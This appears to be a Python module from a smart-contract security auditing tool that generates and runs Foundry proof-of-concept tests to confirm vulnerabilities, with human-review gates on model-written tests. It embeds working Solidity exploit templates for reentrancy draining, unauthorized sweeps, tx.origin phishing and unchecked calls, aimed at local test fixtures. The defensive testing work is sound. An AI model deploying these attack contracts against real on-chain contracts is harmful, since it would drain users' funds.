import hashlib
import json
import re
from pathlib import Path

from sentinel.foundry.evidence import exploit_tests, oracle_hashes, passed
from sentinel.foundry.runner import FoundryRunner
from sentinel.llm.base import LLMProvider
from sentinel.schemas.artifacts import ExploitArtifact
from sentinel.schemas.state import RuntimeState
from sentinel.schemas.vulnerability import FindingStatus


class RedTeam:
    """Layer 2: Reason and Act by creating a local executable Foundry test."""

    def __init__(self, foundry: FoundryRunner, provider: LLMProvider[str] | None = None) -> None:
        self.foundry = foundry
        self.provider = provider

    def generate_and_validate(self, state: RuntimeState) -> RuntimeState:
        finding = next((item for item in state.findings if item.id == state.candidate_id), None)
        if finding is None:
            return state
        state.exploit_confirmed = False
        state.exploit_artifact = None
        state.exploit_result = None
        state.baseline_exploit_result = None
        state.baseline_regression_result = None
        state.oracle_test_hashes = {}
        project = Path(state.workspace_path or state.project_path).resolve()
        source_file = finding.file or (state.source_files[0] if state.source_files else "")
        source_path = (project / source_file).resolve()
        if not source_file or not source_path.is_relative_to(project) or not source_path.is_file():
            state.feedback.append("Candidate source is missing or outside the project.")
            state.final_verification_state = "human_review_required"
            return state
        test_source = self._fixture_test(finding.id, source_file)
        origin = "reviewed_fixture" if test_source else "model_generated"
        if test_source is None and self.provider is not None:
            source = source_path.read_text(encoding="utf-8")
            prompt = (
                "Generate one defensive Foundry proof-of-concept test for this vulnerability candidate. "
                "Return only Solidity source with a testExploit() function. Import the target using the "
                f'exact relative path "../{source_file}". Do not use network calls, shell commands, or deployment.\n'
                + json.dumps({"finding": finding.model_dump(mode="json"), "source": source})
            )
            try:
                test_source = self._extract_solidity(self.provider.generate(prompt))
            except (RuntimeError, ValueError) as exc:
                state.feedback.append(f"Red Team provider could not generate a PoC: {exc}")
                state.final_verification_state = "human_review_required"
                return state
        if test_source is None:
            state.feedback.append("No safe deterministic PoC template is available for this candidate.")
            state.final_verification_state = "human_review_required"
            return state
        test_name = f"SentinelExploit_{hashlib.sha256(finding.id.encode()).hexdigest()[:16]}.t.sol"
        test_path = project / "test" / test_name
        if test_path.exists() or not test_path.resolve().is_relative_to(project):
            state.feedback.append("Exploit output path already exists or escapes the project; nothing was overwritten.")
            state.final_verification_state = "human_review_required"
            return state
        test_path.parent.mkdir(parents=True, exist_ok=True)
        test_path.write_text(test_source, encoding="utf-8")
        state.exploit_source = test_source
        state.exploit_artifact = ExploitArtifact(
            vulnerability_id=finding.id, test_file=str(test_path), source=test_source,
            rationale="The PoC is restricted to the target Foundry project and testExploit.",
            origin=origin,
        )
        if origin == "model_generated":
            state.feedback.append("Model-generated PoC saved as an unexecuted draft. Its assertions require human review before they can establish a security finding.")
            finding.status = FindingStatus.HUMAN_REVIEW_REQUIRED
            state.final_verification_state = "human_review_required"
            return state
        relative_test = test_path.relative_to(project).as_posix()
        state.oracle_test_hashes = oracle_hashes(project, set(state.original_source))
        state.exploit_result = self.foundry.exploit(project, test_file=relative_test)
        state.baseline_exploit_result = state.exploit_result
        state.exploit_artifact.execution = state.exploit_result
        tests = exploit_tests(state.exploit_result, relative_test, "testExploit")
        state.exploit_confirmed = bool(tests and passed(state.exploit_result, "testExploit"))
        if state.exploit_result.exit_code == -1:
            state.feedback.append("Red Team could not run Forge. Install Foundry and ensure `forge` is on PATH.")
            state.final_verification_state = "execution_unavailable"
            return state
        if not state.exploit_confirmed:
            finding.status = FindingStatus.HUMAN_REVIEW_REQUIRED
            state.final_verification_state = "human_review_required"
            state.feedback.append("The candidate was not confirmed by an executed, passing exploit test. This does not prove it safe.")
        else:
            finding.status = FindingStatus.CONFIRMED
            state.baseline_regression_result = self.foundry.regression(project)
            if not passed(state.baseline_regression_result):
                state.final_verification_state = "human_review_required"
                state.feedback.append("Baseline regression tests are absent, failing, or inconclusive; automated repair is blocked.")
        state.exploit_artifact.confirmed = state.exploit_confirmed
        return state

    @staticmethod
    def _extract_solidity(response: str) -> str:
        blocks = re.findall(r"```(?:solidity)?\s*(.*?)```", response, flags=re.DOTALL | re.IGNORECASE)
        source = blocks[0].strip() if blocks else response.strip()
        if "pragma solidity" not in source or not re.search(r"function\s+testExploit\s*\(", source):
            raise ValueError("response must contain Solidity and a testExploit function")
        if "../" not in source:
            raise ValueError("response must import the target project with a relative path")
        return source + "\n"

    @staticmethod
    def _fixture_test(finding_id: str, source_file: str) -> str | None:
        if finding_id == "heuristic-reentrancy":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; }}

contract ReentrancyAttacker {{
    VulnerableVault private immutable vault;
    uint256 private entered;
    constructor(VulnerableVault target) {{ vault = target; }}
    function attack() external payable {{ vault.deposit{{value: msg.value}}(); vault.withdraw(); }}
    receive() external payable {{
        if (entered == 0 && address(vault).balance >= 1 ether) {{
            entered = 1;
            vault.withdraw();
        }}
    }}
}}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnerableVault private vault;
    ReentrancyAttacker private attacker;
    function setUp() public {{
        vm.deal(address(this), 2 ether);
        vault = new VulnerableVault();
        vault.deposit{{value: 1 ether}}();
        attacker = new ReentrancyAttacker(vault);
    }}
    function testExploit() public {{
        attacker.attack{{value: 1 ether}}();
        require(address(attacker).balance == 2 ether, "reentrancy did not drain victim funds");
    }}
}}
'''
        if finding_id == "heuristic-access-control":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; function prank(address sender) external; }}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnerableTreasury private treasury;
    address private constant attacker = address(0xA11CE);
    function setUp() public {{
        vm.deal(address(this), 1 ether);
        treasury = new VulnerableTreasury{{value: 1 ether}}();
    }}
    function testExploit() public {{
        vm.prank(attacker);
        treasury.sweep(payable(attacker));
        require(address(treasury).balance == 0, "unauthorized sweep was blocked");
    }}
}}
'''
        if finding_id == "heuristic-tx-origin":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; function startPrank(address sender, address origin) external; function stopPrank() external; }}

contract PhishingAttacker {{
    function trick(TxOriginWallet wallet, address payable recipient) external {{ wallet.withdraw(recipient); }}
}}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    TxOriginWallet private wallet;
    PhishingAttacker private attacker;
    address private constant owner = address(0xB0B);
    address private constant thief = address(0xA11CE);
    function setUp() public {{
        vm.deal(owner, 1 ether);
        vm.startPrank(owner, owner);
        wallet = new TxOriginWallet{{value: 1 ether}}();
        vm.stopPrank();
        attacker = new PhishingAttacker();
    }}
    function testExploit() public {{
        vm.startPrank(owner, owner);
        attacker.trick(wallet, payable(thief));
        vm.stopPrank();
        require(address(wallet).balance == 0, "tx.origin phishing was blocked");
    }}
}}
'''
        if finding_id == "heuristic-unchecked-call":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; }}

contract RejectingRecipient {{ receive() external payable {{ revert("reject payment"); }} }}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    UncheckedCallWallet private wallet;
    RejectingRecipient private recipient;
    function setUp() public {{
        vm.deal(address(this), 1 ether);
        wallet = new UncheckedCallWallet();
        recipient = new RejectingRecipient();
    }}
    function testExploit() public {{
        wallet.deposit{{value: 1 ether}}();
        wallet.withdraw(payable(address(recipient)));
        require(wallet.balances(address(this)) == 0, "unchecked call did not lose accounting credit");
        require(address(wallet).balance == 1 ether, "recipient unexpectedly received funds");
    }}
}}
'''
        return None
